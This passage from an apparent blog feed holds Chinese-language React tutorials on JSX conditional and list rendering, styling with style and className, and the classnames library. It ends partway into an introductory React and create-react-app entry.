&lt;div&gt;是否成年：&#123;data.age &gt; 16 ? '是' : '否'&#125;&lt;/</span>div&gt;</span><br><span class="line">    &#123;<span class="comment">/* 4. 使用函数 */</span>&#125;</span><br><span class="line">    &lt;div&gt;姓名大写：&#123;up()&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* <span class="number">5.</span> 使用JSX(jsx也是表达式) *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;朋友：&#123;list&#125;&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="JSX-条件渲染"><a href="#JSX-条件渲染" class="headerlink" title="JSX 条件渲染"></a>JSX 条件渲染</h2><ul><li>使用分支语句 <strong><code>if/else</code></strong> 完成条件渲染</li><li>使用 <strong><code>三元运算符</code></strong> 完成条件渲染</li><li>使用 <strong><code>逻辑运算符</code></strong> 完成条件渲染</li></ul><h3 id="if-else-条件渲染"><a href="#if-else-条件渲染" class="headerlink" title="if/else 条件渲染"></a>if/else 条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能在JSX中写语句，但，可以充分利用JS能力</span></span><br><span class="line"><span class="keyword">const</span> getContent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (loading) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>数据加载完毕，这是显示数据<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;getContent()&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><h3 id="三元运算符-完成条件渲染"><a href="#三元运算符-完成条件渲染" class="headerlink" title="三元运算符 完成条件渲染"></a>三元运算符 完成条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &#123;loading ? <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>数据加载完毕，这是显示数据<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h3 id="逻辑运算-完成条件渲染"><a href="#逻辑运算-完成条件渲染" class="headerlink" title="逻辑运算 完成条件渲染"></a>逻辑运算 完成条件渲染</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &#123;loading &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">    &#123;loading || <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>数据加载完毕，这是显示数据<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><h2 id="JSX-列表渲染"><a href="#JSX-列表渲染" class="headerlink" title="JSX 列表渲染"></a>JSX 列表渲染</h2><ul><li>可以渲染 <strong><code>JSX</code></strong> 数组</li><li>使用 <strong><code>map</code></strong> 渲染列表</li><li>直接在 <strong><code>JSX</code></strong> 中使用 <strong><code>map</code></strong> 渲染列表</li><li><strong><code>key</code></strong> 属性使用</li></ul><h3 id="可以渲染-JSX-数组"><a href="#可以渲染-JSX-数组" class="headerlink" title="可以渲染 JSX 数组"></a>可以渲染 JSX 数组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. const list = ['tom', 'jack', 'tony'] 把数组转换成如下JSX数组</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>tom<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>, &lt;li&gt;jack&lt;<span class="regexp">/li&gt;, &lt;li&gt;tony&lt;/</span>li&gt;];</span><br><span class="line"><span class="comment">// 2. 把JSX嵌入在UL标签中</span></span><br><span class="line"><span class="keyword">const</span> elemet = <span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>&#123;list&#125;<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><h3 id="使用-map-渲染列表"><a href="#使用-map-渲染列表" class="headerlink" title="使用 map 渲染列表"></a>使用 map 渲染列表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 转jsx数组</span></span><br><span class="line"><span class="keyword">const</span> list2 = list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> &lt;li&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;);</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 3. 使用</span></span><br><span class="line"><span class="regexp">const element = &lt;ul&gt;&#123;list2&#125;&lt;/u</span>l&gt;;</span><br></pre></td></tr></table></figure><h3 id="直接在-JSX-中使用-map-渲染列表"><a href="#直接在-JSX-中使用-map-渲染列表" class="headerlink" title="直接在 JSX 中使用 map 渲染列表"></a>直接在 JSX 中使用 map 渲染列表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 使用 map调用其实也是js表达式</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &#123;list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">      &lt;li&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    ))&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/u</span>l&gt;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="key-属性使用"><a href="#key-属性使用" class="headerlink" title="key 属性使用"></a>key 属性使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: Each child in a list should have a unique "key" prop.</span></span><br><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [<span class="string">'tom'</span>, <span class="string">'jack'</span>, <span class="string">'tony'</span>];</span><br><span class="line"><span class="comment">// 2. 使用</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &#123;list.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">      &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    ))&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/u</span>l&gt;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-style-方式"><a href="#JSX-样式-style-方式" class="headerlink" title="JSX 样式 - style 方式"></a>JSX 样式 - style 方式</h2><ul><li><strong><code>style</code></strong> 接受一个采用<strong>小驼峰</strong>命名属性的 <code>JavaScript</code> 对象，而不是 <code>CSS</code> 字符串</li><li><strong><code>style</code></strong> 中的 <code>key</code> 采用<strong>小驼峰</strong>命名是为了与 <code>JS</code> 访问 <code>DOM</code> 节点的属性保持一致</li><li><strong><code>React</code></strong> 会自动添加 ”px” 后缀到内联样式为数字的属性后，其他单位需要手动添加</li></ul><p>演示代码</p><ul><li>需求：去掉上一个列表案例 <code>ul</code> 的点，加上背景样式，设置字体大小，给第一个 <code>p</code> 设置两倍字体大小</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 数据</span></span><br><span class="line"><span class="keyword">const</span> list = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">100</span>, <span class="attr">name</span>: <span class="string">'tom'</span>, <span class="attr">age</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">101</span>, <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">102</span>, <span class="attr">name</span>: <span class="string">'tony'</span>, <span class="attr">age</span>: <span class="number">20</span> &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">+<span class="comment">// 2. 样式</span></span><br><span class="line">+<span class="keyword">const</span> styleObject = &#123;</span><br><span class="line">+  listStyle: <span class="string">'none'</span>,</span><br><span class="line">+  backgroundColor: <span class="string">'pink'</span>,</span><br><span class="line">+  fontSize: <span class="number">20</span></span><br><span class="line">+&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用</span></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">+  <span class="xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">style</span>=<span class="string">&#123;styleObject&#125;</span> &gt;</span></span></span><br><span class="line"><span class="xml">    &#123;list.map(item =&gt; &#123;</span></span><br><span class="line"><span class="xml">      return (</span></span><br><span class="line">        &lt;li key=&#123;item.id&#125;&gt;</span><br><span class="line">+          &lt;p style=&#123;&#123;fontSize: '2em'&#125;&#125;&gt;姓名：&#123;item.name&#125;&lt;/p&gt;</span><br><span class="line">          &lt;p&gt;是否成年：&#123;item.age &gt; 16 ? '是' : '否'&#125;&lt;/p&gt;</span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">      )</span></span><br><span class="line"><span class="xml">    &#125;)&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>))</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-className-方式"><a href="#JSX-样式-className-方式" class="headerlink" title="JSX 样式 - className 方式"></a>JSX 样式 - className 方式</h2><blockquote><p>在多数情况下，应使用 <strong><code>className</code></strong> 属性来引用外部 <code>CSS</code> 样式表中定义的 <code>class</code></p></blockquote><ul><li><strong><code>className</code></strong> 设置类名，和 <code>class</code> 属性要求一样只能是字符串</li><li>如果需要根据数据设置类名，可以使用 <strong><code>{ }</code></strong> 嵌入 <code>JS</code> 表达式实现</li></ul><p>演示代码：</p><ul><li>需求：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名</li></ul><p>index.css 代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.button</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> <span class="number">#ccc</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">user-select</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#069</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#069</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.button</span><span class="selector-class">.block</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.js 代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="comment">// 在src下新建index.css文件，导入进来即可</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;span className=&#123;<span class="string">`button <span class="subst">$&#123;isActive ? <span class="string">'active'</span> : <span class="string">''</span>&#125;</span>`</span>&#125;&gt;按钮&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="JSX-样式-动态-className"><a href="#JSX-样式-动态-className" class="headerlink" title="JSX 样式 - 动态 className"></a>JSX 样式 - 动态 className</h2><ul><li>在使用 <strong><code>className</code></strong> 的时候遇见多个类名动态绑定，可以模仿 <code>vue</code> 使用对象的方式</li><li><strong><code>vue</code></strong> 中绑定类名的时候使用 <code>{类名:布尔}</code> 用布尔值决定是否加上这个类名</li></ul><p>例如：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名，<code>isBlock</code> 数据的值添加 <code>block</code> 类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据</span></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">const</span> isBlock = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名对象</span></span><br><span class="line"><span class="keyword">const</span> classObject = &#123;</span><br><span class="line">  button: <span class="literal">true</span>,</span><br><span class="line">  active: isActive,</span><br><span class="line">  block: isBlock,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换成字符串</span></span><br><span class="line"><span class="keyword">const</span> className = <span class="built_in">Object</span>.keys(classObject)</span><br><span class="line">  .filter(<span class="function">(<span class="params">key</span>) =&gt;</span> classObject[key])</span><br><span class="line">  .join(<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&#123;className&#125;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h2 id="JSX-样式-classnames-库"><a href="#JSX-样式-classnames-库" class="headerlink" title="JSX 样式 - classnames 库"></a>JSX 样式 - classnames 库</h2><p>使用 <code>JS</code> 原生的能力处理多个类名的动态绑定，当然这样的需求已经有 <strong><code>classnames</code></strong> 库给我们解决了。</p><h3 id="安装导入-classnames"><a href="#安装导入-classnames" class="headerlink" title="安装导入 classnames"></a>安装导入 classnames</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">npm i classnames</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者 </span></span><br><span class="line">yarn add classnames</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入</span></span><br><span class="line"><span class="keyword">import</span> classNames <span class="keyword">from</span> <span class="string">'classnames'</span></span><br></pre></td></tr></table></figure><h3 id="认识-classnames-API"><a href="#认识-classnames-API" class="headerlink" title="认识 classnames API"></a>认识 classnames API</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用字符串</span></span><br><span class="line">classNames(<span class="string">'foo'</span>, <span class="string">'bar'</span>); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 2. 使用对象</span></span><br><span class="line">classNames(&#123; <span class="attr">foo</span>: <span class="literal">true</span>, <span class="attr">bar</span>: <span class="literal">true</span> &#125;); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 3. 使用数组</span></span><br><span class="line">classNames([<span class="string">'foo'</span>, <span class="string">'bar'</span>]); <span class="comment">// foo bar</span></span><br><span class="line"><span class="comment">// 4. 混合使用</span></span><br><span class="line">classNames(<span class="string">'foo'</span>, &#123; <span class="attr">bar</span>: <span class="literal">true</span> &#125;); <span class="comment">// foo bar</span></span><br></pre></td></tr></table></figure><p>例如还是上面那个需求：在元素 <code>button</code>上根据 <code>isActive</code> 数据的值添加 <code>active</code> 类名，<code>isBlock</code> 数据的值添加 <code>block</code> 类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="comment">// 1. 导入classnames</span></span><br><span class="line"><span class="keyword">import</span> classNames <span class="keyword">from</span> <span class="string">'classnames'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 数据</span></span><br><span class="line"><span class="keyword">const</span> isActive = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">const</span> isBlock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 产生类名</span></span><br><span class="line"><span class="keyword">const</span> className = classNames(<span class="string">'button'</span>, &#123;</span><br><span class="line">  active: isActive,</span><br><span class="line">  block: isBlock,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&#123;className&#125;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JSX-基本概念&quot;&gt;&lt;a href=&quot;#JSX-基本概念&quot; class=&quot;headerlink&quot; title=&quot;JSX 基本概念&quot;&gt;&lt;/a&gt;JSX 基本概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;JSX&lt;/code&gt; 是 &lt;code&gt;JavaScri
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="JSX" scheme="//www.shen.ee/tags/JSX/"/>
    
      <category term="JSX语法" scheme="//www.shen.ee/tags/JSX%E8%AF%AD%E6%B3%95/"/>
    
      <category term="XML" scheme="//www.shen.ee/tags/XML/"/>
    
  </entry>
  
  <entry>
    <title>React快速上手</title>
    <link href="//www.shen.ee/article/44037.html"/>
    <id>//www.shen.ee/article/44037.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="React介绍"><a href="#React介绍" class="headerlink" title="React介绍"></a>React介绍</h2><blockquote><p>了解 react 的历史背景和基本概念</p></blockquote><p><a href="https://reactjs.org/" target="_blank" rel="noopener">React</a> 起源于 Facebook 的内部项目。因为该公司对市场上所有 JavaScript <a href="https://so.csdn.net/so/search?q=MVC&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener">MVC</a> 框架，都不满意，就决定自己写一套，用来架设 Instagram 的网站。做出来以后，发现这套东西很好用，就在 2013 年 5 月开源了。</p><p>React 是最流行的前端<a href="https://so.csdn.net/so/search?q=框架&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener">框架</a>之一。对比近两年 <a href="https://npm-stat.com/charts.html?package=angular&amp;package=react&amp;package=vue&amp;from=2019-10-01&amp;to=2021-09-30" target="_blank" rel="noopener">Vue 和 Angular</a> 的下载量，还有 2021 年开发者使用的 web 框架的 <a href="https://insights.stackoverflow.com/survey/2021#most-popular-technologies-webframe" target="_blank" rel="noopener">比例</a> ，可以看到 React 是前端工程师应该必备技能之一，现在很多大厂也在使用它。</p><p><img src="https://oss.iyouhun.com/img/md/QQ20220607-134043@2x.png" alt="QQ20220607-134043@2x"></p><p>React 是一个用于构建用户界面的 JavaScript 库。可以理解它只负责 MVC 中的视图层渲染，不直接提供数据模型和控制器功能。react-router 实现路由，redux 实现状态管理，可以使用它们来构建一个完整应用。</p><p>React 中文站：<a href="https://zh-hans.reactjs.org/" target="_blank" rel="noopener">React 官方中文文档 – 用于构建用户界面的 JavaScript 库</a></p><p><strong>总结：</strong> React 是 Facebook 开源的，现在它是最流行的前端框架大厂必备，React 本身是一个构建 UI 的库，如果需要开发一个完整的 web 应用需要配合 react-router，redux，…等。</p><h2 id="React特点"><a href="#React特点" class="headerlink" title="React特点"></a>React特点</h2><blockquote><p>了解 react 的三个核心特点</p></blockquote><h3 id="1-声明式"><a href="#1-声明式" class="headerlink" title="(1)声明式"></a>(1)声明式</h3><p>React 使创建交互式 UI 变得轻而易举。为你应用的每一个状态设计简洁的视图，当数据变动时 React 能高效更新并渲染合适的组件。</p><p>以声明式编写 UI，可以让你的代码更加可靠，且方便调试。</p><p><img src="https://oss.iyouhun.com/img/md/image-20220607141033348.png" alt="image-20220607141033348"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220607141042978.png" alt="image-20220607141042978"></p><h3 id="2-组件化"><a href="#2-组件化" class="headerlink" title="(2)组件化"></a>(2)组件化</h3><p>创建拥有各自状态的组件，再由这些组件构成更加复杂的 UI。 组件逻辑使用 JavaScript 编写而非模版，因此你可以轻松地在应用中传递数据，并使得状态与 DOM 分离。</p><p><img src="https://oss.iyouhun.com/img/md/1633579096420.db143907.png" alt="1633579096420.db143907"></p><h3 id="3-一次学习，跨平台编写"><a href="#3-一次学习，跨平台编写" class="headerlink" title="(3)一次学习，跨平台编写"></a>(3)一次学习，跨平台编写</h3><p>无论你现在使用什么技术栈，在无需重写现有代码的前提下，通过引入 React 来开发新功能。React 还可以使用 Node 进行服务器渲染，或使用 <a href="https://reactnative.dev/" target="_blank" rel="noopener">React Native</a> 开发原生移动应用。</p><p><img src="https://oss.iyouhun.com/img/md/1633578566552.7b549f39.png" alt="1633578566552.7b549f39"></p><p><strong>总结：</strong> 声明式 UI 更清晰快捷，组件化开发更灵活，可支持 SSR,SPA ,NativeApp,VR 多平台。</p><h2 id="React-脚手架"><a href="#React-脚手架" class="headerlink" title="React 脚手架"></a>React 脚手架</h2><blockquote><p>掌握使用 create-react-app 脚手架创建项目</p></blockquote><p>创建项目方式：</p><ul><li>全局安装脚手架再使用命令创建项目</li><li>使用 npx 远程调用脚手架创建项目</li></ul><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><ul><li>全局安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 全局安装脚手架</span></span><br><span class="line">npm i create-react-app -g</span><br></pre></td></tr></table></figure><ul><li>创建项目</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> project-name 项目名称</span></span><br><span class="line">create-react-app 